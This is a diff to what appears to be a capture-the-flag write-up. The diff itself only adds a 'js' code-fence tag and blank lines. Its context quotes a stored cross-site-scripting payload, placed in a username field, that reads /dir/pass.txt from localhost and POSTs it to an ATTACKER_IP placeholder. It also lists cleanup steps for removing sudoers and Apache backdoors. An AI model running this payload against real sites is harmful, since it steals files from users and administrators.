@@ -162,7 +162,7 @@ We know that admin is at localhost by reading the update.txt where he says **"th
 We now know that we need to exfiltrate /dir/pass.txt using javascript.
 After a bit of researching we learn how to post data using javascript.
 So the malicious javascript for retrieving pass.txt is:
-```
+```js
 <script>fetch("http://127.0.0.1/dir/pass.txt").then(x => x.text()).then(y => fetch("http://<ATTACKER_IP>:<ATTACKER_PORT>", {method: "POST", body:y}));</script>
 ```
 We make a account with the exploit code as username and some weak password like pass123.
@@ -333,7 +333,11 @@ Note: If the key exchange was done by DHE or EDHE, then there isn't any way to d
 ## Extra(Do it if you want to??):-
 
 We see that we are not able to delete /var/www/web even though we are root because the immutable bit is set and it can be checked by `lsattr`.
+
 So we remove immutable bits wherever the attacker placed them by `chattr -i <FILE_NAME>`.
+
 We see that the group h4ck3d is a backdoor to execute commands as root by checking out /etc/sudoers.(Remove this group)
+
 Check all files in /etc/apache2 and remove the backdoor the attacker used. (The APACHE_RUN_GROUP is set to h4ck3d)
+
 Lastly sanitize inputs.
